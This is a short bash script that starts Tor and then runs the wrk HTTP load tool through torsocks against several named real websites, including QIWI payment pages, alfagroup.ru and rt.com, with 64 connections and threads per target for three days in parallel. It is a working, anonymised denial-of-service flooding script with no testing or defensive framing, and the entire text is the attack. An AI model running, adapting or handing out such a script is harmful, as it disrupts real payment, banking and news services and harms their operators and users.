#!/bin/bash


[[ -z $(service tor status | grep "tor is running") ]] && service tor start
sleep 5

NUM0=4
NUM1=$(($NUM0*4))
NUM2=$(($NUM1*4))
DLEN=$((3*3600*24))
URLS=(
  "https://checkout.qiwi.com/"
  "https://alfagroup.ru:443/"
  "https://rt.com:443/"
   "http://rt.com:80/"
  "https://qiwi.com"
  "https://my.qiwi.com"
  "https://p2p.qiwi.com"
  )

for TURL in ${URLS[*]}
do
  A=$NUM2
  B=$DLEN
  C=$TURL
  
  torsocks wrk -c$A -t$A -d$B --timeout 5s $C &
done


